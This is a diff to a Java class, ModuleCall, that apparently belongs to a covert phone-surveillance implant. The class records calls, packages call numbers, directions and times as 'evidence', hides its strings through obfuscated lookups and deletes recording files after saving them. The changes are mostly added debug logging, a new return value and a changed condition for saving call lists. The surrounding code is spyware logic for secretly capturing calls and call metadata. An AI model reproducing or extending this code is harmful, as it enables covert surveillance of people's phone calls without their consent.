@@ -93,7 +93,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): number: " + call.getNumber()); //$NON-NLS-1$
+			Check.log(TAG + " (notification): number: " + call.getNumber() + " in:" + call.isIncoming() + " runn:" + isRunning()); //$NON-NLS-1$
 		}
 
 		if (call.isComplete() == false) {
@@ -112,12 +112,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			number = call.getNumber();		
 		}
 		
-		if(number==null){
+		if (number == null) {
 			number="";
 		}
 
 		final DateTime to = new DateTime(call.getTimestamp());
 		int ret = 0;
+		
 		try {
 			// Let's start with call recording
 			if (record && isSupported()) {
@@ -130,7 +131,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
-		if (!call.isOngoing()) {
+
+		if (!record && !call.isOngoing()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): Saving CallList evidence"); //$NON-NLS-1$
+			}
+
 			saveCalllistEvidence(number, incoming, from, to);
 		}
 
@@ -199,9 +205,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return 0;
 	}
 
-	private void saveCallEvidence(String number, boolean incoming, DateTime from, DateTime to, String currentRecordFile) {
+	private boolean saveCallEvidence(String number, boolean incoming, DateTime from, DateTime to, String currentRecordFile) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile);
+			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " number: " + number + " from: " + from + " to: " + to + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(number, incoming, from, to);
@@ -238,10 +244,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
+				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
 			}
 
 			file.delete();
+			
+			return true;
+		}else{
+			return false;
 		}
 	}
 
@@ -303,19 +313,23 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		additionalData.write(caller);
 		additionalData.write(callee);
+		
 		return additionaldata;
 	}
 
 	private void saveCalllistEvidence(String number, boolean incoming, DateTime from, DateTime to) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCalllistEvidence): " + number);
+			Check.log(TAG + " (saveCalllistEvidence): " + number + " from: " + from + " to: " + to);
 		}
+		
 		if (Cfg.DEBUG) { Check.asserts(number!=null, " (saveCalllistEvidence) Assert failed"); }
 		final boolean outgoing = !incoming;
 		// final int duration = call.getDuration(call);
 
 		final String name = ""; //$NON-NLS-1$
 		final boolean missed = false;
+		// 7_0=u
+		// 7_1=no notes
 		final String nametype = Messages.getString("7_0"); //$NON-NLS-1$
 		final String note = Messages.getString("7_1"); //$NON-NLS-1$
 
@@ -336,6 +350,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		databuffer.writeInt(LOG_CALLIST_VERSION);
 		databuffer.writeLong(from.getFiledate());
 		databuffer.writeLong(to.getFiledate());
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (saveCalllistEvidence): Duration from: " + from.getFiledate() + " to: " + to.getFiledate()); //$NON-NLS-1$
+		}
 
 		final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
 		databuffer.writeInt(flags);
